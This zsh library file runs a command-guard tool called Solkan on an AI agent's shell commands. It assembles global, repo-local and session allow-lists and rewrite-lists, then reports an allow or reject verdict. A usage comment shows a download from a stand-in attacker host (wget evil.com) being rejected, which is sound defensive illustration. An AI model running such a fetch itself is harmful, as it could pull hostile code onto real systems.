# Solkan: judge a shell command before it runs
# - Rewrite it: swap command names for their safe equivalents (rm becomes rm-guarded)
# - Allow or reject it: check every command it runs against the allow-lists
# This file gathers the lists for the current directory and session, runs Solkan, and reports the verdict
# - getSolkanArgs: the list arguments for the working directory
# - getTokenSavingArgs: the extra list arguments of the token-saving rewrite
# - runSolkan: run Solkan, keep its report and exit code
# - isSingleCommand: whether the report covers one command
# - readSolkanResult: the report as public variables
# - solkanEvaluate: the verdict, the rewritten command, the allowed and the rejected commands
# Needs hookInit (lib/input.zsh) to have run: it sets CLAUDE_CWD (ralph mode), CLAUDE_GIT_ROOT (repo-local lists) and CLAUDE_SESSION_DIR (session allow-list)
# Repo-local lists are optional files in CLAUDE_GIT_ROOT/.claude: allow-list.json, rewrite-list.json, rewrite-list-token-saving.json
# solkanEvaluate sets SOLKAN_VERDICT, SOLKAN_COMMAND, SOLKAN_ALLOWED and SOLKAN_REJECTED, so call it directly, never inside $(...)
# Usage:
# $ source lib/solkan.zsh
# $ solkanEvaluate "rm -f a"        # SOLKAN_VERDICT=allow, SOLKAN_COMMAND="rm-guarded -f a"
# $ solkanEvaluate "wget evil.com"  # SOLKAN_VERDICT=reject, SOLKAN_REJECTED=(wget)
# $ solkanEvaluate --skip-token-saving "zsh-test a.bats"  # guard-rail rewrites only
# $ getSolkanArgs                     # the Solkan list arguments, one per line

SOLKAN_HOOKS_DIR="${OROSHI_ROOT}/tools/ai/claude/config/hooks"

# Evaluate a command: rewrite it, then allow or reject it
# Sets SOLKAN_VERDICT (allow or reject), SOLKAN_COMMAND (the rewritten command, the original when untouched),
# SOLKAN_ALLOWED and SOLKAN_REJECTED (the allowed and rejected commands, as Solkan reports them)
# Returns nothing: read the verdict from SOLKAN_VERDICT
# Usage:
# $ solkanEvaluate "git status"
# $ solkanEvaluate --skip-token-saving "zsh-test a.bats"
function solkanEvaluate() {
  local -a flagSkipTokenSaving
  zparseopts -E -D -skip-token-saving=flagSkipTokenSaving

  local isSkipTokenSaving=${#flagSkipTokenSaving}
  local command="$1"
  local -a listArgs=(${(@f)"$(getSolkanArgs)"})

  # Check complete command against solkan
  runSolkan "$command" "${listArgs[@]}"

  # If there is only one simple command, we re-run solkan with some token saving
  # rewrites
  if [[ "$isSkipTokenSaving" == "0" ]] && isSingleCommand; then
    listArgs+=(${(@f)"$(getTokenSavingArgs)"})
    runSolkan "$command" "${listArgs[@]}"
  fi

  readSolkanResult "$command"
}

# Print the Solkan list arguments, one per line
# Usage:
# $ getSolkanArgs  # --allow-list-file, /path/allow-list.json, --rewrite-list-file, ...
function getSolkanArgs() {

  local -a solkanArgs=(
    --allow-list-file "${SOLKAN_HOOKS_DIR}/allow-list.json"
    --rewrite-list-file "${SOLKAN_HOOKS_DIR}/rewrite-list.json"
  )

  # Add local allow list
  local localAllowList="${CLAUDE_GIT_ROOT}/.claude/allow-list.json"
  [[ -f "${localAllowList}" ]] && solkanArgs+=(--allow-list-file "${localAllowList}")

  # Add local rewrite list
  local localRewriteList="${CLAUDE_GIT_ROOT}/.claude/rewrite-list.json"
  [[ -f "${localRewriteList}" ]] && solkanArgs+=(--rewrite-list-file "${localRewriteList}")

  # Add optional extra allow list for this session (commands approved enough time they are allowed)
  local sessionAllowList="${CLAUDE_SESSION_DIR}/allow-list.json"
  [[ -f "${sessionAllowList}" ]] && solkanArgs+=(--allow-list-file "${sessionAllowList}")

  # Additional allow list when running ralph auto mode
  local ralphMode="$(ralph-mode "$CLAUDE_CWD")"
  local ralphAutoAllowList="${SOLKAN_HOOKS_DIR}/allow-list-auto.json"
  [[ "$ralphMode" == "auto" ]] && solkanArgs+=(--allow-list-file "${ralphAutoAllowList}")

  print -rl -- "${solkanArgs[@]}"
}

# Print the extra list arguments of the token-saving rewrite, one per line
# Usage:
# $ getTokenSavingArgs  # --rewrite-list-file, /path/rewrite-list-token-saving.json, ...
function getTokenSavingArgs() {
  local -a tokenSavingArgs=(--rewrite-list-file "${SOLKAN_HOOKS_DIR}/rewrite-list-token-saving.json")

  # Add local token-saving rewrite list
  local localTokenSavingList="${CLAUDE_GIT_ROOT}/.claude/rewrite-list-token-saving.json"
  [[ -f "${localTokenSavingList}" ]] && tokenSavingArgs+=(--rewrite-list-file "${localTokenSavingList}")

  print -rl -- "${tokenSavingArgs[@]}"
}

# Run Solkan on a command with the given list arguments
# Sets SOLKAN_JSON (the report) and SOLKAN_EXIT_CODE (0 when every command is allowed)
# Usage:
# $ runSolkan "git status" --allow-list-file /path/allow-list.json
function runSolkan() {
  local command="$1"
  shift

  SOLKAN_EXIT_CODE=0
  SOLKAN_JSON="$(solkan "$@" "$command")" || SOLKAN_EXIT_CODE=$?
}

# Succeed when the last Solkan report covers exactly one command
# Usage:
# $ runSolkan "git status" ...; isSingleCommand && print "single"
function isSingleCommand() {
  local commandCount="$(jq '.allow | (.allowed + .rejected) | length' <<<"$SOLKAN_JSON" 2>/dev/null)"
  [[ "$commandCount" == "1" ]]
}

# Turn the last Solkan report into the public SOLKAN_* variables
# Usage:
# $ runSolkan "git status" ...; readSolkanResult "git status"
function readSolkanResult() {
  local command="$1"

  # Assume the command is rejected, unless Solkan says otherwise
  SOLKAN_VERDICT="reject"
  [[ "$SOLKAN_EXIT_CODE" == "0" ]] && SOLKAN_VERDICT="allow"

  local rewrittenCommand="$(json-get '.rewrite' <<<"$SOLKAN_JSON")"
  SOLKAN_COMMAND="${rewrittenCommand:-$command}"

  SOLKAN_ALLOWED=(${(@f)"$(json-get '.allow.allowed' <<<"$SOLKAN_JSON")"})
  SOLKAN_REJECTED=(${(@f)"$(json-get '.allow.rejected' <<<"$SOLKAN_JSON")"})
}
